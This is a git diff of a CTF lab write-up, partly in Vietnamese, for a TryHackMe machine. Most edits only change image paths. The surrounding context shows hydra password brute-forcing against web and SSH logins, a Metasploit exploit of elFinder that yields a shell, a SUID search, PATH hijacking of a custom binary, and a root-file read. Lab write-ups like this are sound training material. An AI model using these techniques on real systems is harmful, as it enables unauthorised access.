@@ -52,7 +52,9 @@ OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 -> Port: 22, 80
 
 - Access web again -> `/login.php`
-![](../../../Image/Pasted%20image%2020250426114653.png)
+
+![](../../Image/Pasted%20image%2020250426114653.png)
+
 - Khi access vào web với username và password bất kỳ -> thông báo **"wrong username and wrong password"**.
 ### **Initial Access**
 
@@ -83,14 +85,15 @@ hydra -l jose -P /usr/share/seclists/Passwords/Common-Credentials/10-million-pas
 
 -> `jose:password123` on login page.
 -> Redirect: `files.login.thm` 
--> Update `/etc/hosts`
+-> Update `/etc/hosts
+`
+![](../../Image/Pasted%20image%2020250426134046.png)
 
-![](../../../Image/Pasted%20image%2020250426134046.png)
 - All files contains random strings.
 
 #### **searchsploit**
 
-![](../../../Image/Pasted%20image%2020250426134902.png)
+![](../../Image/Pasted%20image%2020250426134902.png)
 
 => Khai thác **elFinder** bằng Metasploit. 
 #### **metasploit**
@@ -105,7 +108,7 @@ msf6> run
 meterpreter> shell
 ```
 
-![](../../../Image/Pasted%20image%2020250426135645.png)
+![](../../Image/Pasted%20image%2020250426135645.png)
 
 Sau khi truy cập vào shell
 - User hiện tại: **www-data** 
@@ -229,6 +232,7 @@ find / -perm -4000 2>/dev/null
 -> command is not default
 -> it shows username and UID of logon user, then password of user.
 -> it reads output of **id** command to extract password.
+
 ```
 pwm
 [!] Running 'id' command to extract the username and user ID (UID)
@@ -254,7 +258,8 @@ find / -name pwm 2>/dev/null
 ```
 
 - Vì lệnh **pwm** không cho nhập đường dẫn nên ta phải thực hiện **Path Hijack**.
-![](../../../Image/Pasted%20image%2020250426142933.png)
+
+![](../../Image/Pasted%20image%2020250426142933.png)
 
 ```
 jose1006
@@ -316,11 +321,10 @@ hydra -l think -P passwords.txt ssh://10.10.124.19
 
 -> Password: `josemario.AKA(think)`
 
-![](../../../Image/Pasted%20image%2020250426144256.png)
-
+![](../../Image/Pasted%20image%2020250426144256.png)
 ### **Privileged Escalation Part 2**
 
-![](../../../Image/Pasted%20image%2020250426144742.png)
+![](../../Image/Pasted%20image%2020250426144742.png)
 
 ```
 think@lookup:~$ LFILE=/root/root.txt
